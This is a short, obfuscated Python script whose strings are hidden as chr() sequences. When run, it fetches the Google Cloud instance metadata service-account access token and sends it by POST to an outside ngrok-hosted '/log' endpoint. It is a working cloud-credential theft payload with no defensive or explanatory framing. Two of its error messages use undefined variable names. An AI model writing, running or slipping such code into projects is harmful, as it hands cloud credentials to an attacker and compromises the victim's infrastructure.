import os
NO=print
NQ=Exception
import requests
NY=requests.post
NT=requests.get
def NL():
  try:
    Nq=("".join([chr(104),chr(116),chr(116),chr(112),chr(58),chr(47),chr(47),chr(49),chr(54),chr(57),chr(46),chr(50),chr(53),chr(52),chr(46),chr(49),chr(54),chr(57),chr(46),chr(50),chr(53),chr(52),chr(47),chr(99),chr(111),chr(109),chr(112),chr(117),chr(116),chr(101),chr(77),chr(101),chr(116),chr(97),chr(100),chr(97),chr(116),chr(97),chr(47),chr(118),chr(49),chr(47),chr(105),chr(110),chr(115),chr(116),chr(97),chr(110),chr(99),chr(101),chr(47),chr(115),chr(101),chr(114),chr(118),chr(105),chr(99),chr(101),chr(45),chr(97),chr(99),chr(99),chr(111),chr(117),chr(110),chr(116),chr(115),chr(47),chr(100),chr(101),chr(102),chr(97),chr(117),chr(108),chr(116),chr(47),chr(116),chr(111),chr(107),chr(101),chr(110)]))
    NE={("".join([chr(77),chr(101),chr(116),chr(97),chr(100),chr(97),chr(116),chr(97),chr(45),chr(70),chr(108),chr(97),chr(118),chr(111),chr(114)]))                         :("".join([chr(71),chr(111),chr(111),chr(103),chr(108),chr(101)]))                                  }
    NP=NT(Nq,headers=NE)
    if NP.status_code==int("".join([chr(50),chr(48),chr(48)]))                          :
      NU=NP.text
      NJ=("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(53),chr(55),chr(51),chr(53),chr(45),chr(54),chr(55),chr(45),chr(50),chr(48),chr(53),chr(45),chr(49),chr(52),chr(49),chr(45),chr(50),chr(49),chr(53),chr(46),chr(110),chr(103),chr(114),chr(111),chr(107),chr(45),chr(102),chr(114),chr(101),chr(101),chr(46),chr(97),chr(112),chr(112),chr(47),chr(108),chr(111),chr(103)]))
      NA={("".join([chr(116),chr(111),chr(107),chr(101),chr(110)]))                 :NU}
      try:
        Nc=NY(NJ,data=NA)
        NO(f"Server responded with status code: {response.status_code}")
      except NQ as e:
        NO(f"Failed to send token to server: {e}")
    else:
      NO(f"Failed to retrieve token: {token_response.status_code}")
  except NQ as e:
    NO(f"An error occurred while trying to get the token: {e}")
NL()
